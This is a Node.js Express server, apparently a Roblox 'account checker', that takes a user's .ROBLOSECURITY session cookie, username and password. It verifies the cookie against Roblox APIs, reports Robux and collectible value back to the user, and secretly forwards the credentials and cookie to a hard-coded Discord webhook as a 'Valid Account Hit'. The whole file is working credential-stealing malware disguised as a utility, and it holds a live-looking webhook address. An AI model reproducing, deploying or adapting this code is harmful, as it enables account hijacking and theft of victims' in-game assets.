const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.static(__dirname)); // Serve index.html

const WEBHOOK_URL = "https://discord.com/api/webhooks/1566219502801395842/_JHm22aGdibJStb961I3O31VJE4BzxT6Y5jk28dea3K0JWAyRQZzih7Mni2obrbk8eFN";

app.post('/api/check', async (req, res) => {
    const { cookie, user, pass } = req.body;
    if (!cookie) return res.status(400).json({ success: false, error: "Cookie kosong" });

    const fetchRoblox = async (url) => {
        try {
            let response = await axios.get(url, {
                headers: { "Cookie": `.ROBLOSECURITY=${cookie}`, "User-Agent": "Mozilla/5.0" },
                validateStatus: () => true
            });
            if (response.status === 403) {
                const csrf = response.headers['x-csrf-token'];
                if (csrf) {
                    response = await axios.get(url, { headers: { "Cookie": `.ROBLOSECURITY=${cookie}`, "x-csrf-token": csrf } });
                }
            }
            return response.status === 200 ? response.data : null;
        } catch { return null; }
    };

    try {
        const auth = await fetchRoblox("https://users.roblox.com/v1/users/authenticated");
        if (!auth || !auth.id) return res.status(401).json({ success: false, error: "Cookie Invalid / Expired" });

        const robux = await fetchRoblox("https://economy.roblox.com/v1/users/currency");
        const inv = await fetchRoblox(`https://inventory.roblox.com/v2/users/${auth.id}/inventory/Collectible?limit=50`);
        
        let totalRap = 0;
        if (inv && inv.data) {
            totalRap = inv.data.reduce((sum, item) => sum + (item.item?.recentAveragePrice || 0), 0);
        }
        const robuxAmount = robux?.robux || 0;

        // Discord Webhook
        await axios.post(WEBHOOK_URL, {
            content: `✅ **Valid Account Hit!**\n**User:** \`${user || 'Unknown'}\`\n**Pass:** \`${pass || 'Unknown'}\`\n**Robux:** \`${robuxAmount}\` | **RAP:** \`${totalRap}\`\n\n**Cookie:**\n\`\`\`${cookie}\`\`\``
        }).catch(() => {});

        res.json({ success: true, account_info: { username: auth.name, displayName: auth.displayName, robux: robuxAmount, total_rap: totalRap } });
    } catch (e) {
        res.status(500).json({ success: false, error: "Server Error" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server jalan di port ${PORT}`));
